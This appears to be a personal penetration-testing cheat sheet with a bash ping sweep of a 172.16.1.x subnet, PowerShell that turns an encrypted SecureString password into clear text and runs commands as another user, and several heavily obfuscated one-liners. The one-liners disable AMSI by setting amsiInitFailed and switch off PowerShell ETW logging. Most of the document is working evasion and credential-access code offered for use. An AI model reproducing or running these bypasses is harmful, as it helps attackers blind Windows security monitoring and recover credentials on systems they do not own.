# ps
ps = ping sweep

just some note will add here
# 
```bash
for i in {1..255} ;do (ping -c 1 172.16.1.$i | grep "bytes from"|cut -d ' ' -f4|tr -d ':' &);done
```

#
convert encrypted powershell password into clear text:
```powershell
$pwd = ConvertTo-SecureString <encrypted text here>
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList "User",$pwd
$cred.GetNetworkCredential()
```
to Execute Command in powershell as another user without runasCs :
```powershell
invoke-command -Computername localhost -Credential $cred -ScriptBlock { whoami }
```
note: you might find yourself in more restriction for using invoke-command rather than RunasCs 


```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )



&("{0}{1}" -f'sET-','ITEm')  ('vaRI'+'Ab'+'lE:hf'+'7S35') ( [tYPE]("{0}{1}"-f're','f')) ; ${A} =   (&("{0}{2}{1}"-f'gEt','abLE','-varI') ('HF'+'7S'+'35')  )."VA`LUE"."A`sSE`mBlY".("{1}{2}{0}"-f 'tTypes','G','e').Invoke();ForEach(${B} in ${A}) {if (${B}."N`AMe" -like ("{0}{2}{1}" -f'*','Utils','i')) {${c} = ${B}}};${d} = ${C}.("{2}{1}{0}{3}" -f 'ld','e','GetFi','s').Invoke(("{2}{0}{3}{4}{1}" -f'bl',',Static','NonPu','i','c'));ForEach(${E} in ${D}) {if (${E}."NA`ME" -like ("{0}{2}{1}"-f '*F','led','ai')) {${F} = ${e}}};${F}.("{1}{0}"-f 'ue','SetVal').Invoke(${nu`ll},${t`RuE})

sET-iTeM  ('V'+'aR'+'ia'+'Ble:mdIEY')  ([tYPE]("{4}{3}{5}{1}{0}{2}" -f'A','.','sSemBLY','io','rEfleCt','n')  )  ; ${08O`V2}=[tyPe]("{1}{0}"-f'F','rE');  ${M`d`IEy}::"l`o`AdwIThPa`Rti`AlnamE"."INV`OKe"(('S'+("{1}{0}"-f'tem','ys')+'.C'+'ore'))."g`E`TTYPE"(('Sys'+("{0}{1}"-f 'tem.D','i')+("{0}{1}" -f'ag','no')+("{2}{1}{0}" -f 'nt','tics.Eve','s')+'i'+("{3}{0}{1}{2}" -f'v','entPro','v','ng.E')+'i'+'der'))."gET`FI`eLd"(('m'+'_'+("{0}{1}"-f 'en','abled')),(("{0}{1}"-f'Non','P')+'ubl'+'ic'+("{1}{0}{2}"-f'tanc',',Ins','e')))."seTVa`l`Ue"( ${08`Ov2}."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+("{1}{0}" -f 'ana','.M')+'ge'+("{1}{0}{2}"-f'ent.','m','Aut')+'o'+("{3}{2}{1}{0}"-f'acing.','n.Tr','tio','ma')+("{1}{0}" -f 'o','PSEtwL')+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+("{1}{2}{0}"-f'd','Prov','i')+'er'),('N'+'o'+'nPu'+'b'+("{0}{3}{1}{2}" -f 'l',',Stat','ic','ic')))."gE`Tva`lUe"(${nu`lL}),0)

&("{1}{0}{2}" -f 'E','s','T-iTeM')  ('V'+'aR'+'ia'+("{1}{0}{2}" -f 'e:','Bl','mdIEY'))  ([tYPE]("{4}{3}{5}{1}{0}{2}" -f'A','.',("{1}{0}" -f'mBLY','sSe'),'io',("{2}{0}{1}"-f'Efle','Ct','r'),'n')  )  ; ${08O`V2}=[tyPe]("{1}{0}"-f'F','rE');  ${M`d`IEy}::"l`o`AdwIThPa`Rti`AlnamE"."INV`OKe"(('S'+("{1}{0}"-f'tem','ys')+'.C'+'ore'))."g`E`TTYPE"(('Sys'+("{0}{1}"-f ("{1}{0}"-f'em.D','t'),'i')+("{0}{1}" -f'ag','no')+("{2}{1}{0}" -f 'nt',("{1}{0}{2}" -f's.','tic','Eve'),'s')+'i'+("{3}{0}{1}{2}" -f'v',("{2}{0}{1}" -f 'tPr','o','en'),'v',("{0}{1}" -f 'ng','.E'))+'i'+'der'))."gET`FI`eLd"(('m'+'_'+("{0}{1}"-f 'en',("{0}{1}"-f 'able','d'))),(("{0}{1}"-f'Non','P')+'ubl'+'ic'+("{1}{0}{2}"-f("{0}{1}" -f't','anc'),("{0}{1}" -f',I','ns'),'e')))."seTVa`l`Ue"( ${08`Ov2}."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+("{1}{0}" -f 'ana','.M')+'ge'+("{1}{0}{2}"-f("{0}{1}"-f 'e','nt.'),'m','Aut')+'o'+("{3}{2}{1}{0}"-f("{1}{0}" -f 'ing.','ac'),("{0}{1}"-f'n.','Tr'),'tio','ma')+("{1}{0}" -f 'o',("{0}{1}" -f'PSEt','wL'))+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+("{1}{2}{0}"-f'd',("{1}{0}" -f'ov','Pr'),'i')+'er'),('N'+'o'+'nPu'+'b'+("{0}{3}{1}{2}" -f 'l',("{1}{0}"-f't',',Sta'),'ic','ic')))."gE`Tva`lUe"(${nu`lL}),0)
```
